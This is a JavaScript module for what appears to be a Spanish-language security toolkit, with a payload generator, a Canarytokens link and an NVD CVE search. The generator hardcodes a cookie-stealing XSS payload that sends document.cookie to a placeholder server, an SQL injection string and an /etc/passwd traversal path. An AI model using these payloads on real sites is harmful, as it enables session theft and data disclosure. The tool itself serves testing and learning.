import { mostrarToast } from '../core/toast.js';
import { $ } from '../core/dom.js';
import { logHerramienta } from '../core/logger.js';

export function initPayloads() {
  window.generarPayload = () => {
    const tipo = $('#payload-tipo').value;
    const input = $('#payload-input').value.trim() || 'http://test.com';
    const result = $('#payload-result');
    
    let payload = '';

    if (tipo === 'xss') {
      payload = `<script>fetch('https://tu-servidor.com/log?c='+document.cookie)</script>`;
    } else if (tipo === 'sqli') {
      payload = `' OR '1'='1' -- -`;
    } else if (tipo === 'lfi') {
      payload = `../../../../etc/passwd`;
    }

    result.textContent = payload;
    result.style.color = 'var(--neon-green)';
    logHerramienta('Generador Payloads', tipo, input, payload);
  };

  window.abrirCanarytoken = (tipo, desc) => {
    window.open('https://canarytokens.org/generate', '_blank');
    mostrarToast(`Sigue las instrucciones en la web para generar tu ${tipo}.`, 'info');
    logHerramienta('Canarytokens', tipo, '', 'Abierto');
  };

  window.buscarCVE = async () => {
    const query = $('#cve-input').value.trim();
    const result = $('#cve-result');
    if (!query) return mostrarToast("Introduce un término de búsqueda", "error");

    result.innerHTML = 'Buscando...';
    result.style.color = 'var(--text-main)';

    try {
      const res = await fetch(`https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(query)}`);
      const data = await res.json();
      
      if (data.vulnerabilities && data.vulnerabilities.length > 0) {
        let html = '';
        data.vulnerabilities.slice(0, 5).forEach(v => {
          const cve = v.cve;
          const desc = cve.descriptions.find(d => d.lang === 'en')?.value || 'Sin descripción';
          html += `<div style="margin-bottom: 10px; padding-bottom: 10px; border-bottom: 1px solid var(--border);"><strong style="color:var(--danger)">${cve.id}</strong><br>${desc}</div>`;
        });
        result.innerHTML = html;
        result.style.color = 'var(--text-main)';
        logHerramienta('Buscador CVEs', 'Buscar', query, data.vulnerabilities.length + ' encontrados');
      } else {
        result.innerHTML = 'No se encontraron CVEs para esta búsqueda.';
        result.style.color = 'var(--neon-gold)';
      }
    } catch {
      result.innerHTML = 'Error al buscar CVEs. La API puede estar limitando peticiones.';
      result.style.color = 'var(--danger)';
    }
  };
}
